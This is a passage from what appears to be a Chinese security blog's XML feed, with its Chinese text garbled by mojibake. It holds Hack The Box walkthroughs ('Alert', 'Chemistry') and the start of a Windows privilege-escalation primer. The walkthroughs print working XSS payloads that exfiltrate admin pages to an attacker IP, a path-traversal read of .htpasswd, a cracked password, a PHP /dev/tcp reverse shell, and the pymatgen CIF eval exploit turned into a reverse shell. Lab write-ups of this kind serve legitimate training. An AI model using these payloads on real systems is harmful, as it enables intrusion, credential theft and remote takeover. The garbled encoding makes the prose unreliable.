href="https://www.bdpnt.com/kepu/2667.html">https://www.bdpnt.com/kepu/2667.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-Alert</title>
      <link href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"/>
      <url>/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157852400-389493bf-f21e-4539-adfb-7a9fceb78f2d.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734079889364-48ed658e-a906-4215-96cf-83686963ea1d.png"></p><p>å¼€æ”¾ç«¯å£ï¼š22ã€80ï¼Œhttpserver æ˜¯ Apache</p><p>è¿›å…¥ 80 ç«¯å£çš„ç½‘é¡µï¼Œå‘ç°å­˜åœ¨ Markdown æ–‡ä»¶ä¸Šä¼ </p><p>æ ¹æ®Alertï¼ŒçŒœæµ‹æ˜¯xss</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734080736755-59392a62-694e-47a7-9f8b-2eb75a462b69.png"></p><h3 id="å­åŸŸåçˆ†ç ´"><a href="#å­åŸŸåçˆ†ç ´" class="headerlink" title="å­åŸŸåçˆ†ç ´"></a>å­åŸŸåçˆ†ç ´</h3><p>ffuf -w &#x2F;root&#x2F;fuzzDicts&#x2F;subdomainDicts&#x2F;main.txt -u <a href="http://alert.htb/">http://alert.htb</a> -H â€œHost:FUZZ.alert.htbâ€ -ac</p><p><code>**-ac**</code></p><ul><li>è‡ªåŠ¨è¿‡æ»¤å“åº”ï¼Œæ’é™¤é‚£äº›å“åº”å¤§å°ä¸å…¶ä»–å¤šæ•°å“åº”ç›¸ä¼¼çš„è¯·æ±‚ã€‚</li><li>è¿™ä¸ªåŠŸèƒ½æœ‰åŠ©äºå‡å°‘æ— å…³çš„è¾“å‡ºï¼Œè®©æ¨¡ç³Šæµ‹è¯•çš„ç»“æœæ›´èšç„¦ã€‚</li></ul><h3 id="xssæ¼æ´è§¦å‘ç‚¹"><a href="#xssæ¼æ´è§¦å‘ç‚¹" class="headerlink" title="xssæ¼æ´è§¦å‘ç‚¹"></a>xssæ¼æ´è§¦å‘ç‚¹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ è¿™ä¸ªè„šæœ¬ï¼Œèµ·python8888ç«¯å£ç›‘å¬ï¼Œå‘é€è¿‡å»ä¹‹åè§£ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143694804-5e15ed60-1ada-407a-a60a-f629c25944cd.png"></p><p>å†å‘é€contact usé™„ä¸Šåˆšæ‰mdæ–‡ä»¶é“¾æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143736344-0fbf6602-74c1-4c35-abaf-cc5375e5c450.png"></p><p>è¿™è¾¹çŒœæµ‹åå°æœ‰ç®¡ç†å‘˜æœºå™¨äººè‡ªåŠ¨ç‚¹å‡»é“¾æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143769013-138d1cc5-e1b5-4374-82ba-9a3970fdd6dc.png"></p><p>å‘ç°ç®¡ç†å‘˜å¤šä¸ªmessagesç•Œé¢</p><p>å†å‘ä¸€æ¬¡ï¼ŒåŒæ­¥ä¸Šè¿°æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734143943390-ea143ce1-8ae0-4fab-8c7b-8a038e2f9cb7.png"></p><p>å¯ä»¥å¼€å§‹æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=filepath&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.xx.xx:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç»è¿‡å°è¯•ï¼Œæ— æ³•ç›´æ¥è¯»å–åˆ° &#x2F;etc&#x2F;passwd è¿™ç§æ•æ„Ÿæ–‡ä»¶</p><p>ä½†æ˜¯è€ƒè™‘åˆ° web æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ Apacheï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p><p>äºæ˜¯æœ‰æ•ˆè½½è·å°±ä¿®æ”¹ä¸ºäº†è¿™æ ·â†“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(&quot;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&quot;)</span><br><span class="line"></span><br><span class="line">  .then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    fetch(&quot;http://10.10.16.11:8888/?file_content=&quot; + encodeURIComponent(data));</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142899045-031df263-6648-47c1-bc72-570110d215ea.png"></p><p>%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A</p><p>urlè§£ç </p><pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre><p>åªä¿ç•™preä¸­é—´çš„å†…å®¹åˆ°.hashåç¼€æ–‡ä»¶ä¸­</p><h3 id="çˆ†ç ´hash"><a href="#çˆ†ç ´hash" class="headerlink" title="çˆ†ç ´hash"></a>çˆ†ç ´hash</h3><p>john â€“wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt â€“format&#x3D;md5crypt-long alert.hash</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141313880-0743371f-a2cf-4836-839e-4f3bfbff65fa.png"></p><p>albert:manchesterunited</p><p>ssh <a href="mailto:&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;">&#x61;&#x6c;&#98;&#x65;&#114;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#46;&#x31;&#49;&#46;&#x34;&#x34;</a></p><p>pa -auxçœ‹ç«¯å£ï¼Œå‘ç°8080å¼€ç€phpæˆ–è€…ä¸Šä¼ linpeas</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141476707-f41a9979-1bd7-48fb-b38a-ed5299e903b1.png"></p><p>çœ‹ä¸‹è¿›ç¨‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141628448-47b55910-f62c-40dc-9f7a-c403a39e48f3.png"></p><p>çœ‹åˆ°configè¿™ä¸ªæ–‡ä»¶å±äºrootï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹phpå†…å®¹åå¼¹shellã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734141706952-00ddc997-a807-4dbd-a782-f60be3d77fc1.png"></p><p>ç›‘å¬</p><?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.16.11/9999 0>&1'"); ?><p>å¦‚æœæ²¡ååº”å†curlä¸€ä¸‹127.0.0.1:8080</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734142794331-1f8c3933-7475-4d19-9ec7-e93f4556c513.png"></p><h2 id="Chemistry"><a href="#Chemistry" class="headerlink" title="Chemistry"></a>Chemistry</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734158410936-284ccf4d-4dca-4a7d-8a82-fc2b2dba0ece.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734157886992-2eb4c7e2-a246-4f73-818c-e1f70bff065d.png"></p><p>nmapæ‰«æ</p><p>æ‰«åˆ°5000ç«¯å£</p><h3 id="æ¼æ´åˆ©ç”¨ç‚¹"><a href="#æ¼æ´åˆ©ç”¨ç‚¹" class="headerlink" title="æ¼æ´åˆ©ç”¨ç‚¹"></a>æ¼æ´åˆ©ç”¨ç‚¹</h3><p><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></p><h3 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h3><p><code>JonesFaithfulTransformation.from_transformation_str()</code>åº“ä¸­çš„æ–¹æ³•å­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´<code>pymatgen</code>ã€‚æ­¤æ–¹æ³•ä¸å®‰å…¨åœ°åˆ©ç”¨ eval() æ¥å¤„ç†è¾“å…¥ï¼Œåœ¨è§£æä¸å—ä¿¡ä»»çš„è¾“å…¥æ—¶å…è®¸æ‰§è¡Œä»»æ„ä»£ç ã€‚è§£ææ¶æ„åˆ›å»ºçš„ CIF æ–‡ä»¶æ—¶å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ã€‚</p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><p>æ¼æ´åŸå› åœ¨<a href="https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108">pymatgen&#x2F;symmetry&#x2F;settings.py#L97C1-L111C108</a>ä¸­ï¼Œå­˜åœ¨ç¼ºé™·çš„ä»£ç æ®µæ¶‰åŠæ­£åˆ™è¡¨è¾¾å¼æ“ä½œï¼Œç„¶åä½¿ç”¨<code>eval()</code>ã€‚</p><h4 id="æ˜“å—æ”»å‡»çš„ä»£ç "><a href="#æ˜“å—æ”»å‡»çš„ä»£ç " class="headerlink" title="æ˜“å—æ”»å‡»çš„ä»£ç "></a>æ˜“å—æ”»å‡»çš„ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">basis_change = [</span><br><span class="line">    re.sub(r&quot;(?&lt;=\w|\))(?=\() | (?&lt;=\))(?=\w) | (?&lt;=(\d|a|b|c))(?=([abc]))&quot;, r&quot;*&quot;, string, flags=re.X)</span><br><span class="line">    for string in basis_change</span><br><span class="line">]</span><br><span class="line">&quot;&quot;&quot;snip&quot;&quot;&quot;</span><br><span class="line">([eval(x, &#123;&quot;__builtins__&quot;: None&#125;, &#123;&quot;a&quot;: a, &quot;b&quot;: b, &quot;c&quot;: c&#125;) for x in basis_change])</span><br></pre></td></tr></table></figure><p><code>__builtins__</code>å³ä½¿å°† evalè®¾ç½®ä¸ºï¼Œä½¿ç”¨ eval<code>None</code>ä»å­˜åœ¨å®‰å…¨é£é™©ã€‚<code>BuiltinImporter</code>å¯ä»¥ä½¿ç”¨å­ç±»éå†æ¥æ¢å¤è¯¥ç±»ã€‚  </p><h3 id="æ¦‚å¿µè¯æ˜"><a href="#æ¦‚å¿µè¯æ˜" class="headerlink" title="æ¦‚å¿µè¯æ˜"></a>æ¦‚å¿µè¯æ˜</h3><p>è¯¥æ¼æ´å¯åˆ©ç”¨å¦‚ä¸‹æ–¹å¼ï¼š</p><p><code>vuln.cif</code>åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;touch pwned&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç è§£æcifæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pymatgen.io.cif import CifParser</span><br><span class="line">parser = CifParser(&quot;vuln.cif&quot;)</span><br><span class="line">structure = parser.parse_structures()</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pocï¼Œä¿®æ”¹æ¦‚å¿µè¯æ˜ä¸­çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data_5yOhtAoR</span><br><span class="line">_audit_creation_date            2018-06-08</span><br><span class="line">_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><span class="line"></span><br><span class="line">loop_</span><br><span class="line">_parent_propagation_vector.id</span><br><span class="line">_parent_propagation_vector.kxkykz</span><br><span class="line">k1 [0 0 0]</span><br><span class="line"></span><br><span class="line">_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.11/4343 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_space_group_magn.number_BNS  62.448</span><br><span class="line">_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></pre></td></tr></table></figure><p>ä¼ ä¸Šå»è§£ææœ‰é—®é¢˜</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windowsæƒé™æå‡</title>
      <link href="/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºç¡€ç‚¹ï¼š"><a href="#åŸºç¡€ç‚¹ï¼š" class="headerlink" title="åŸºç¡€ç‚¹ï¼š"></a>åŸºç¡€ç‚¹ï¼š</h1><p>0ã€ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦å­¦ä¹ æƒé™æå‡è½¬ç§»æŠ€æœ¯ï¼š</p><p>ç®€å•æ¥è¯´å°±æ˜¯è¾¾åˆ°ç›®çš„è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°å®ƒ</p><p>1ã€å…·ä½“æœ‰å“ªäº›æƒé™éœ€è¦æˆ‘ä»¬äº†è§£æŒæ¡çš„ï¼š</p><p>åå°æƒé™ï¼Œæ•°æ®åº“æƒé™ï¼ŒWebæƒé™ï¼Œç”¨æˆ·æƒé™ï¼ŒæœåŠ¡å™¨æƒé™ï¼Œå®¿ä¸»æœºæƒé™ï¼ŒåŸŸæ§åˆ¶å™¨æƒé™</p><p>2ã€ä»¥ä¸Šå¸¸è§æƒé™è·å–æ–¹æ³•ç®€è¦å½’ç±»è¯´æ˜ï¼š</p><p>åå°æƒé™ï¼šSQLæ³¨å…¥ï¼Œæ•°æ®åº“æ³„æ¼ï¼Œå¼±å£ä»¤æ”»å‡»ï¼Œæœªæˆæƒè®¿é—®ç­‰é€ æˆ</p><p>æ•°æ®åº“æƒé™ï¼šSQLæ³¨å…¥ï¼Œæ•°æ®åº“æ³„æ¼ï¼Œå¼±å£ä»¤æ”»å‡»ï¼Œæœªæˆæƒè®¿é—®ç­‰é€ æˆ</p><p>Webæƒé™ï¼šRCE,ååºåˆ—åŒ–,æ–‡ä»¶ä¸Šä¼ ç­‰ç›´è¾¾æˆ–é€šè¿‡åå°æ•°æ®åº“é—´æ¥é€ æˆ</p><p>ç”¨æˆ·æƒé™ï¼šå¼±å£ä»¤,æ•°æ®æ³„æ¼ç­‰ç›´è¾¾æˆ–é€šè¿‡Webï¼ŒæœåŠ¡å™¨åŠåŸŸæ§è½¬ç§»é€ æˆ</p><p>æœåŠ¡å™¨æƒé™ï¼šç³»ç»Ÿå†…æ ¸æ¼æ´,é’“é±¼åé—¨æ”»å‡»,ä¸»æœºè½¯ä»¶å®‰å…¨ç›´è¾¾æˆ–ä¸Šè¿°æƒé™æå‡é€ æˆ</p><p>å®¿ä¸»æœºæƒé™ï¼šDockerä¸å®‰å…¨é…ç½®æˆ–æ¼æ´æƒé™æå‡ç›´è¾¾ï¼ˆæœåŠ¡èµ„äº§é€ æˆå…¥å£åæå‡ï¼‰</p><p>åŸŸæ§åˆ¶å™¨æƒé™ï¼šå†…ç½‘åŸŸè®¡ç®—æœºç”¨æˆ·æå‡æˆ–è‡ªèº«å†…æ ¸æ¼æ´ï¼Œåé—¨æ”»å‡»ï¼Œä¸»æœºè½¯ä»¶å®‰å…¨ç›´è¾¾</p><p>3ã€ä»¥ä¸Šå¸¸è§æƒé™è·å–åèƒ½æ“ä½œçš„å…·ä½“äº‹æƒ…ï¼š</p><p>åå°æƒé™ï¼šæ–‡ç« ç®¡ç†ï¼Œç«™ç‚¹ç®¡ç†ï¼Œæ¨¡ç‰ˆç®¡ç†ï¼Œæ•°æ®ç®¡ç†ï¼Œä¸Šä¼ ç®¡ç†ç­‰</p><p>æ•°æ®åº“æƒé™ï¼šæ“ä½œæ•°æ®åº“çš„æƒé™ï¼Œæ•°æ®å¢åˆ æ”¹æŸ¥ç­‰ï¼ˆä»¥æ•°æ®åº“ç”¨æˆ·ä¸ºä¸»ï¼‰</p><p>Webæƒé™ï¼šæºç æŸ¥çœ‹ï¼Œæºç æ–‡ä»¶å¢åˆ æ”¹æŸ¥ï¼Œç£ç›˜æ–‡ä»¶æ–‡ä»¶å¤¹æŸ¥çœ‹(ä»¥æƒé™é…ç½®ä¸ºä¸»)</p><p>ç”¨æˆ·æƒé™ï¼šå°±å¦‚åŒè‡ªå·±ç”µè„‘ä¸Šæ™®é€šç”¨æˆ·èƒ½æ“ä½œçš„æƒ…å†µï¼ˆæ•æ„Ÿæ“ä½œä¼šè¢«ç¦æ­¢ï¼‰</p><p>æœåŠ¡å™¨æƒé™ï¼šå°±å¦‚åŒè‡ªå·±ç”µè„‘ä¸Šèƒ½æ“ä½œçš„æƒ…å†µï¼ˆæ•´ä¸ªç³»ç»Ÿéƒ½æ˜¯ä½ çš„ï¼‰</p><p>å®¿ä¸»æœºæƒé™ï¼šå°±å¦‚åŒè‡ªå·±ç”µè„‘ä¸Šèƒ½æ“ä½œçš„æƒ…å†µï¼ˆæ•´ä¸ªç³»ç»Ÿéƒ½æ˜¯ä½ çš„ï¼‰</p><p>åŸŸæ§åˆ¶å™¨æƒé™ï¼šå°±å¦‚åŒè‡ªå·±ç”µè„‘ä¸Šèƒ½æ“ä½œçš„æƒ…å†µï¼ˆæ•´ä¸ªå†…ç½‘åŸŸç³»ç»Ÿéƒ½æ˜¯ä½ çš„ï¼‰</p><p>4ã€ä»¥ä¸Šå¸¸è§æƒé™åœ¨å®æˆ˜ä¸­çš„åº”ç”¨åœºæ™¯ä»‹ç»ï¼š</p><p>å½“æˆ‘ä»¬é€šè¿‡å¼±å£ä»¤è¿›å…¥åˆ°åº”ç”¨åå°ç®¡ç†</p><p>å½“æˆ‘ä»¬ä¸‹è½½å¤‡ä»½æ–‡ä»¶è·å–åˆ°æ•°æ®åº“ä¿¡æ¯</p><p>å½“æˆ‘ä»¬é€šè¿‡æ¼æ´æ‹¿åˆ°èµ„äº§ç³»ç»Ÿçš„Webæƒé™</p><p>å½“æˆ‘ä»¬åœ¨å…¬å¸è¢«ç»™äºˆè´¦å·å¯†ç ç™»å½•è®¡ç®—æœºæˆ–ç³»ç»Ÿ</p><p>å½“æˆ‘ä»¬åœ¨å…¬å¸æˆ–é’“é±¼åé—¨è·å–åˆ°æŸä¸ªå…¬å¸æœºå™¨ç³»ç»Ÿ</p><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p><p>1ã€Webæ­å»ºå¹³å°å·®å¼‚</p><p>é›†æˆè½¯ä»¶ï¼Œè‡ªè¡Œæ­å»ºï¼Œè™šæ‹ŸåŒ–ç­‰</p><p>é›†æˆè½¯ä»¶ï¼šå®å¡”ï¼ŒPhpStudyï¼ŒXAMMPç­‰</p><p>è‡ªè¡Œæ­å»ºï¼šè‡ªå·±ä¸€ä¸ªä¸ªä¸‹è½½å®‰è£…æ­å»ºé…ç½®</p><p>è™šæ‹ŸåŒ–ï¼šDockerï¼ŒESXiï¼ŒQEMUï¼ŒHyper-Vç­‰</p><p>2ã€Webè¯­è¨€æƒé™å·®å¼‚</p><p>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSPç­‰</p><p>æƒé™é«˜ä½ï¼šJSP&gt;ASP.NET&gt;ASP&#x3D;PHP</p><p>3ã€ç³»ç»Ÿç”¨æˆ·æƒé™å·®å¼‚</p><p>Windowsï¼š</p><p>Systemï¼šç³»ç»Ÿç»„ï¼Œæ‹¥æœ‰ç®¡ç†ç³»ç»Ÿèµ„æºçš„æƒé™ï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€ç›®å½•å’Œæ³¨å†Œè¡¨ç­‰ã€‚</p><p>Administratorsï¼šç®¡ç†å‘˜ç»„ï¼Œå…·æœ‰å¯¹è®¡ç®—æœºè¿›è¡Œå®Œå…¨è®¿é—®å’Œæ“ä½œçš„æƒé™ã€‚</p><p>Usersï¼šç”¨æˆ·ç»„ï¼Œä¸€èˆ¬ç”¨æˆ·çš„é»˜è®¤ç»„åˆ«ï¼Œæ‹¥æœ‰è¾ƒä½çš„ç³»ç»Ÿæƒé™ã€‚</p><p>Guestsï¼š</p><p>è®¿å®¢ç»„ï¼Œå¯ä»¥è®¿é—®è®¡ç®—æœºä¸Šçš„å…¬å…±æ–‡ä»¶å¤¹å’Œæ‰“å°æœºï¼Œä½†ä¸èƒ½æ›´æ”¹é…ç½®å’Œå®‰è£…ç¨‹åºã€‚</p><p>Backup Operatorsï¼š</p><p>å¤‡ä»½æ“ä½œå‘˜ç»„ï¼Œå…è®¸ç”¨æˆ·å¤‡ä»½å’Œè¿˜åŸæ•°æ®ï¼Œä½†ä¸èƒ½æ›´æ”¹é…ç½®å®‰è£…ç¨‹åºã€‚</p><p>Power Usersï¼šé«˜çº§ç”¨æˆ·ç»„ï¼Œæ‹¥æœ‰æ¯”ä¸€èˆ¬ç”¨æˆ·æ›´é«˜çš„ç³»ç»Ÿæƒé™ï¼Œä½†æ¯”ç®¡ç†å‘˜ç»„æƒé™ä½ã€‚</p><p>Remote Desktop Usersï¼šè¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥ã€‚</p><p>Network Configuration Operatorsï¼šç½‘ç»œé…ç½®æ“ä½œå‘˜ç»„ï¼Œå…è®¸ç”¨æˆ·ç®¡ç†ç½‘ç»œé…ç½®ã€‚</p><p>Performance Log Usersï¼šæ€§èƒ½æ—¥å¿—ç”¨æˆ·ç»„ï¼Œå…è®¸ç”¨æˆ·æ”¶é›†æ€§èƒ½æ—¥å¿—å’Œè®¡æ•°å™¨æ•°æ®ã€‚</p><p>Distributed COM Usersï¼š</p><p>åˆ†å¸ƒå¼ COM ç”¨æˆ·ç»„ï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨åˆ†å¸ƒå¼ COM è¿æ¥åˆ°è®¡ç®—æœºã€‚</p><p>IIS_IUSRS: ç”¨äºæˆæƒIISç›¸å…³æœåŠ¡çš„ç”¨æˆ·ç»„ã€‚</p><p>Linuxï¼š</p><p>ç³»ç»Ÿç”¨æˆ·ï¼šUID(0-999)</p><p>æ™®é€šç”¨æˆ·ï¼šUID(1000-*)</p><p>rootç”¨æˆ·ï¼šUIDä¸º0ï¼Œæ‹¥æœ‰ç³»ç»Ÿçš„å®Œå…¨æ§åˆ¶æƒé™</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Webåº”ç”¨-ä¸­é—´ä»¶-æ•°æ®åº“"><a href="#Webåº”ç”¨-ä¸­é—´ä»¶-æ•°æ®åº“" class="headerlink" title="Webåº”ç”¨&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“"></a>Webåº”ç”¨&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“</h2><p>èƒŒæ™¯1ï¼šé€šè¿‡å¼±å£ä»¤è¿›å…¥Webåå°ç³»ç»Ÿé€šè¿‡ä¸Šä¼ 